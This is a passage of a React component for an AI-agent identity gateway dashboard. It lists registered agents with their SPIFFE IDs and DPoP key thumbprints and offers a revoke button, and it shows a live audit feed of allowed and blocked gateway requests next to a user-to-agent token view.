                    className="w-full rounded-xl border border-slate-300 px-3 py-2 text-xs font-mono"
                  />
                  <button
                    onClick={handleQuickCAMD}
                    className="w-full py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold"
                  >
                    Discover &amp; Bind CAMD/CRM Agent
                  </button>
                </div>
              </div>
            )}
          </div>
        )}

        {/* -------------------------------------------------------------------
            STEP 3: MY REGISTERED AGENTS & CONSENTS
            ------------------------------------------------------------------- */}
        {activeStepTab === 3 && (
          <div className="space-y-6">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div>
                <h1 className="text-xl font-bold text-slate-900">
                  Step 3 · Your Registered Agents ({agents.length})
                </h1>
                <p className="text-xs text-slate-500 mt-1">
                  Every agent that connects via Step 2 appears here with its
                  SPIFFE workload ID and ES256 DPoP key thumbprint (
                  <code>cnf.jkt</code>).
                </p>
              </div>
              <button
                onClick={() => setActiveStepTab(4)}
                className="px-4 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold flex items-center gap-1.5 shadow-sm"
              >
                <span>Next: Step 4 (Inspect Live Gateway Activity)</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>

            {agents.length === 0 ? (
              <div className="rounded-2xl border-2 border-dashed border-slate-300 bg-white p-10 text-center space-y-3">
                <Bot className="w-10 h-10 text-blue-600 mx-auto" />
                <h3 className="text-base font-bold text-slate-900">
                  No Agents Registered Yet
                </h3>
                <p className="text-xs text-slate-500 max-w-md mx-auto">
                  Go to <b>Step 2 · Connect Your Agent</b> to run your first
                  real Claude, Gemini, or CLI agent.
                </p>
                <button
                  onClick={() => setActiveStepTab(2)}
                  className="px-4 py-2 rounded-xl bg-blue-600 text-white text-xs font-bold"
                >
                  Go to Step 2
                </button>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {agents.map((ag) => (
                  <div
                    key={ag.agent_id}
                    className="rounded-2xl border border-slate-200 bg-white p-5 shadow-sm flex flex-col justify-between gap-4"
                  >
                    <div className="space-y-2.5">
                      <div className="flex items-start justify-between">
                        <div>
                          <h3 className="text-sm font-bold text-slate-900">
                            {ag.name || ag.agent_id}
                          </h3>
                          <code className="text-xs text-blue-600 font-mono">
                            {ag.agent_id}
                          </code>
                        </div>
                        <span
                          className={`text-[10px] font-mono font-bold px-2.5 py-0.5 rounded-full border ${
                            ag.status === "ACTIVE"
                              ? "bg-emerald-50 text-emerald-700 border-emerald-200"
                              : "bg-rose-50 text-rose-700 border-rose-200"
                          }`}
                        >
                          {ag.status}
                        </span>
                      </div>

                      <div className="rounded-xl bg-slate-50 border border-slate-200 p-3 text-xs font-mono space-y-1">
                        <div>
                          <span className="text-slate-500">Human Owner:</span>{" "}
                          <span className="text-slate-900">{ag.owner_user}</span>
                        </div>
                        <div>
                          <span className="text-slate-500">Awake Model:</span>{" "}
                          <span className="text-slate-900">{ag.model_id}</span>
                        </div>
                        <div className="truncate">
                          <span className="text-slate-500">SPIFFE ID:</span>{" "}
                          <span className="text-emerald-700">
                            {ag.spiffe_id}
                          </span>
                        </div>
                        <div className="truncate">
                          <span className="text-slate-500">DPoP cnf.jkt:</span>{" "}
                          <span className="text-blue-700">
                            {ag.dpop_thumbprint}
                          </span>
                        </div>
                      </div>
                    </div>

                    {ag.status === "ACTIVE" && (
                      <button
                        onClick={() => handleRevokeAgent(ag.agent_id)}
                        className="w-full py-2 rounded-xl border border-rose-200 bg-rose-50 hover:bg-rose-100 text-rose-700 text-xs font-bold"
                      >
                        Revoke Agent &amp; Kill Active Passes
                      </button>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* -------------------------------------------------------------------
            STEP 4: LIVE GATEWAY ACTIVITY & USER -> AGENT DIFFERENTIATION
            ------------------------------------------------------------------- */}
        {activeStepTab === 4 && (
          <div className="space-y-6">
            <div>
              <h1 className="text-xl font-bold text-slate-900">
                Step 4 · Live Gateway Decisions &amp; User → Agent Identity
                Differentiation
              </h1>
              <p className="text-xs text-slate-500 mt-1">
                See the exact difference between the Human User and the AI Agent
                (Parent &amp; Child), plus every request allowed or blocked by
                the Go Enforcement Gateway.
              </p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 items-start">
              {/* Left 5 Cols: User -> Agent JSON Hierarchy Card */}
              <div className="lg:col-span-5 rounded-2xl border border-slate-200 bg-white p-5 shadow-sm space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-slate-900 flex items-center gap-1.5">
                    <UserCheck className="w-4 h-4 text-blue-600" />
                    User vs. Agent Identity Object
                  </span>
                  <div className="flex gap-1 bg-slate-100 p-0.5 rounded-lg text-[11px] font-mono">
                    <button
                      onClick={() => setInspectorMode("hierarchy")}
                      className={`px-2 py-1 rounded ${
                        inspectorMode === "hierarchy"
                          ? "bg-blue-600 text-white font-bold"
                          : "text-slate-600"
                      }`}
                    >
                      user → agent
                    </button>
                    <button
                      onClick={() => setInspectorMode("raw_jwt")}
                      className={`px-2 py-1 rounded ${
                        inspectorMode === "raw_jwt"
                          ? "bg-blue-600 text-white font-bold"
                          : "text-slate-600"
                      }`}
                    >
                      RFC 8693 JWT
                    </button>
                  </div>
                </div>

                <pre className="rounded-xl bg-slate-900 text-emerald-300 p-4 text-[11px] font-mono overflow-x-auto leading-relaxed">
                  {JSON.stringify(
                    inspectorMode === "hierarchy"
                      ? userAgentHierarchy
                      : activeClaims || userAgentHierarchy,
                    null,
                    2
                  )}
                </pre>
              </div>

              {/* Right 7 Cols: Live Gateway Audit Feed */}
              <div className="lg:col-span-7 rounded-2xl border border-slate-200 bg-white p-5 shadow-sm space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-slate-900 flex items-center gap-1.5">
                    <KeyRound className="w-4 h-4 text-blue-600" />
                    Live Gateway &amp; Authorization Audit Stream (
                    {auditLogs.length})
                  </span>
                  <button
                    onClick={refreshServerState}
                    className="text-xs text-blue-600 font-semibold hover:underline"
                  >
                    Refresh
                  </button>
                </div>

                {auditLogs.length === 0 ? (
                  <div className="py-12 text-center text-xs text-slate-400">
                    No gateway events yet. Connect your agent in Step 2 to see
                    live authorization and gateway decisions here.
                  </div>
                ) : (
                  <div className="space-y-2.5 max-h-[460px] overflow-y-auto pr-1">
                    {auditLogs.map((log) => {
                      const blocked =
                        log.verdict.includes("block") ||
                        log.verdict === "DENIED" ||
                        log.event_type.includes("BLOCK");
                      return (
                        <div
                          key={log.id}
                          className={`rounded-xl border p-3.5 text-xs space-y-1.5 ${
                            blocked
                              ? "border-rose-200 bg-rose-50/60"
                              : "border-slate-200 bg-slate-50/70"
                          }`}
                        >
                          <div className="flex items-center justify-between">
                            <span className="font-mono font-bold text-slate-900 flex items-center gap-1.5">
                              {blocked ? (
                                <ShieldAlert className="w-4 h-4 text-rose-600" />
                              ) : (
                                <ShieldCheck className="w-4 h-4 text-emerald-600" />
                              )}
                              {log.event_type}
                            </span>
                            <span
                              className={`font-mono text-[10px] font-bold px-2 py-0.5 rounded-full ${
                                blocked
                                  ? "bg-rose-600 text-white"
                                  : "bg-emerald-600 text-white"
                              }`}
                            >
                              {log.verdict.toUpperCase()} (Risk:{" "}
                              {log.risk_score.toFixed(2)} · {log.latency_us}µs)
                            </span>
                          </div>
                          <div className="font-mono text-[11px] text-slate-600">
                            <b>User:</b> {log.actor_user} → <b>Agent:</b>{" "}
                            {log.agent_id}
                          </div>
                          <div className="font-mono text-[11px] text-slate-500 truncate">
                            <b>Target:</b> {log.method} {log.resource}
                          </div>
                          {log.policy_rule && (
                            <div className="font-mono text-[11px] text-rose-700 font-semibold">
                              Rule Triggered: {log.policy_rule}
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
